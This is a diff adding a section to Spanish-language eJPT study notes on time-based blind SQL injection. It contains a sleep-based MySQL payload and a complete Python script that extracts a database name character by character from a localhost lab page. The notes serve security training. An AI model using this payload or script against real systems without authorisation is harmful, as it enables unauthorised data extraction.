@@ -186,3 +186,74 @@ if __name__ == '__main__':
 
         print("\nLa base de datos se llama %s" % info)
 ```
+<a name="time"></a>
+### TIme-Based
+Es muy parecida a la booleana, solo que no devuelve ningun cambio en la respuesta sin importar la condicion. para ello lo que se hace es meter un "sleep" (En caso de MySQL y MariaDB, en otros casos, mirar el cheatsheet.   
+
+```
+AND IF((SUBSTR(database(), 1, 1)=’a’), sleep(5), 1)-- -
+```
+
+En este caso, si la primera letra de la base de datos es "a", tardará 5 segundos en responder. Para automatizar esto, nos motamos un script en python3, en el que modificaremos la URL y la SENTENCIA:  
+```
+#!/usr/bin/python3
+
+import requests
+import sys
+import time
+
+mayusc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+minusc = mayusc.lower()
+numbers = '1234567890'
+simbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'
+
+dictionary = minusc + mayusc + numbers + simbols
+
+def check(offset, letter):
+
+    time_start = time.time()
+    response = requests.get("http://localhost/books.php?id=1 AND IF((SUBSTR(database(), %d, 1)='%s'), sleep(5), 1)#" % (offset, letter))
+    time_end = time.time()
+
+    if time_end - time_start > 5:
+        return 1
+
+def timeSQL():
+
+    global info
+    info = ''
+
+    for i in range(1,100):
+
+        stop = False
+
+        for j in dictionary:
+
+            if check(i, j):
+
+                print("La letra numero %d es %s" % (i, j))
+
+                info += j
+
+                stop = False
+
+                break
+
+            stop = True
+
+        if stop:
+            break
+
+if __name__ == '__main__':
+
+    timeSQL()
+
+    print("\nEl nombre de la base de datos es %s" % info)
+```
+Nos irá extrayendo los datos poco a poco, en funcion del tiempo que tarda el servidor en responder.  
+
+<a name="out"></a>
+### Out of band
+Son en esencia como las BLIND, solo que tenemos la posibilidad de enviar las respuestas a un servidor controlado por nosotros. No tengo información ahora mismo sobre como se lleva a cabo, sin embargo para eJPT en principio no será necesario.
+
+<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes">Menú Principal</a>
